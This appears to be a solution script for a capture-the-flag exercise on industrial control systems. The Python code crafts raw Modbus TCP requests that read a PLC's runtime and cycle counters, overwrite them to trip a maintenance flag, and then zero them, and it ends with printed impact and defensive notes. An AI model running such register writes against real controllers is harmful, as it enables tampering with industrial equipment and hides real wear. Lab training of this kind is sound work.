#!/usr/bin/env python3
"""
CTF Challenge 7: Runtime Manipulation (Medium - 250 points)
Alter the runtime_hours counter to trigger maintenance_flag

Method: Write to runtime_hours register (%MD2 - double register)
"""

import socket
import struct
import time

PLC_HOST = 'localhost'
PLC_PORT = 502

def build_write_multiple_registers(transaction_id, address, values):
    """Build a Modbus Write Multiple Registers request"""
    protocol_id = 0
    unit_id = 1
    function_code = 16

    quantity = len(values)
    byte_count = quantity * 2

    # Pack header
    data_length = 7 + byte_count
    header = struct.pack('>HHHBBHHB',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        quantity,
        byte_count
    )

    # Pack register values
    register_data = b''
    for value in values:
        register_data += struct.pack('>H', value)

    return header + register_data

def build_read_register(transaction_id, address, quantity):
    """Build a Modbus Read Holding Registers request"""
    protocol_id = 0
    data_length = 6
    unit_id = 1
    function_code = 3

    return struct.pack('>HHHBBHH',
        transaction_id,
        protocol_id,
        data_length,
        unit_id,
        function_code,
        address,
        quantity
    )

def parse_read_registers_response(response):
    """Parse a Read Holding Registers response"""
    if len(response) < 9:
        return None

    byte_count = response[8]
    num_registers = byte_count // 2

    registers = []
    for i in range(num_registers):
        offset = 9 + (i * 2)
        reg_value = struct.unpack('>H', response[offset:offset+2])[0]
        registers.append(reg_value)

    return registers

def dint_to_registers(dint_value):
    """Convert a DINT (32-bit int) to two 16-bit registers"""
    high_word = (dint_value >> 16) & 0xFFFF
    low_word = dint_value & 0xFFFF
    return [high_word, low_word]

def registers_to_dint(registers):
    """Convert two 16-bit registers to a DINT (32-bit int)"""
    if len(registers) < 2:
        return 0
    return (registers[0] << 16) | registers[1]

def main():
    print("="*60)
    print("CTF Challenge 7: Runtime Manipulation")
    print("="*60)
    print()
    print("Objective: Trigger maintenance flag by manipulating counters")
    print("Method: Write to runtime_hours DINT register")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((PLC_HOST, PLC_PORT))
        print(f"✓ Connected to PLC at {PLC_HOST}:{PLC_PORT}")
    except Exception as e:
        print(f"❌ Failed to connect: {e}")
        return

    transaction_id = 1

    print("\n[Phase 1] Reading current runtime counters...")
    # Read runtime_hours (DINT at %MD2, which is 2 registers)
    request = build_read_register(transaction_id, 2, 2)
    sock.send(request)
    response = sock.recv(1024)

    registers = parse_read_registers_response(response)
    if registers:
        runtime_hours = registers_to_dint(registers)
        print(f"  Current Runtime Hours: {runtime_hours}")

    transaction_id += 1

    # Read cycle_counter (DINT at %MD4, which is 2 registers)
    request = build_read_register(transaction_id, 4, 2)
    sock.send(request)
    response = sock.recv(1024)

    registers = parse_read_registers_response(response)
    if registers:
        cycle_counter = registers_to_dint(registers)
        print(f"  Current Cycle Counter: {cycle_counter}")

    transaction_id += 1

    # Read maintenance_flag
    request = build_read_register(transaction_id, 7, 1)
    sock.send(request)
    response = sock.recv(1024)

    registers = parse_read_registers_response(response)
    if registers:
        maintenance_flag = registers[0]
        print(f"  Maintenance Flag: {maintenance_flag}")

    transaction_id += 1

    print("\n[Phase 2] Manipulating runtime_hours to trigger maintenance...")
    print("  Setting runtime_hours to 101 (threshold is 100)")

    # Convert 101 to two 16-bit registers (DINT format)
    target_hours = 101
    register_values = dint_to_registers(target_hours)

    # Write to address 2 (runtime_hours DINT)
    request = build_write_multiple_registers(transaction_id, 2, register_values)
    sock.send(request)
    response = sock.recv(1024)
    print("  ✓ Write command sent")

    transaction_id += 1
    time.sleep(0.5)

    print("\n[Phase 3] Verifying counter manipulation...")
    request = build_read_register(transaction_id, 2, 2)
    sock.send(request)
    response = sock.recv(1024)

    registers = parse_read_registers_response(response)
    if registers:
        new_runtime = registers_to_dint(registers)
        print(f"  New Runtime Hours: {new_runtime}")

    transaction_id += 1

    print("\n[Phase 4] Checking maintenance flag...")
    request = build_read_register(transaction_id, 7, 1)
    sock.send(request)
    response = sock.recv(1024)

    registers = parse_read_registers_response(response)
    if registers:
        maintenance_flag = registers[0]
        print(f"  Maintenance Flag: {maintenance_flag}")

        if maintenance_flag == 1:
            print("\n🎯 SUCCESS! Maintenance flag triggered")
            print("   Runtime hours manipulated successfully")
            print("   Challenge completed!")
        else:
            print("\n⚠️  Maintenance flag not set")
            print("   Note: Flag may require PLC scan cycle to update")

    transaction_id += 1

    print("\n[Phase 5] Alternative: Manipulating cycle counter...")
    print("  Setting cycle_counter to 1001 (threshold is 1000)")

    target_cycles = 1001
    register_values = dint_to_registers(target_cycles)

    request = build_write_multiple_registers(transaction_id, 4, register_values)
    sock.send(request)
    sock.recv(1024)
    transaction_id += 1
    time.sleep(0.5)

    request = build_read_register(transaction_id, 4, 2)
    sock.send(request)
    response = sock.recv(1024)

    registers = parse_read_registers_response(response)
    if registers:
        new_cycles = registers_to_dint(registers)
        print(f"  New Cycle Counter: {new_cycles}")

    transaction_id += 1

    print("\n[Phase 6] Restoring counters...")
    # Reset runtime_hours to 0
    request = build_write_multiple_registers(transaction_id, 2, [0, 0])
    sock.send(request)
    sock.recv(1024)
    transaction_id += 1

    # Reset cycle_counter to 0
    request = build_write_multiple_registers(transaction_id, 4, [0, 0])
    sock.send(request)
    sock.recv(1024)
    print("  ✓ Counters reset to 0")

    print("\n[Impact Analysis]")
    print("  • False maintenance triggers can cause unnecessary downtime")
    print("  • Clearing counters hides actual wear and usage")
    print("  • Prevents proper preventive maintenance scheduling")
    print("  • Can lead to equipment failures from deferred maintenance")

    print("\n[Defensive Measures]")
    print("  1. Log counter values to external audit system")
    print("  2. Implement counter change rate limits")
    print("  3. Use write-protected memory for critical counters")
    print("  4. Cross-validate with independent sensor data")

    sock.close()

if __name__ == '__main__':
    main()
